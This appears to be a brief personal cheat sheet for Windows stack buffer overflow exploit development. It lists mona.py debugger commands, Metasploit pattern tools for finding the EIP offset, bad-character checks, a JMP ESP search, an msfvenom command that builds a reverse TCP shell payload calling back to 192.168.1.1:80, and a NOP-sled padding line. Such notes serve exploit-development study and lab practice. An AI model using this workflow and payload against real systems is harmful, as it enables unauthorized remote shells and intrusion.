# mona

```
!mona config -set workingfolder c:\mona\%p

$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600

!mona findmsp -distance 600
EIP contains normal pattern : ... (offset XXXX)
OR
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q (EIP value)

!mona bytearray -b "\x00\x0a" (We need to do it until seeing unmodified)

!mona compare -f C:\mona\test\bytearray.bin -a <address> (ESP address)

!mona jmp -r esp -cpb "\x00\x0a"

msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.1 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c

padding = "\x90" * 16
```
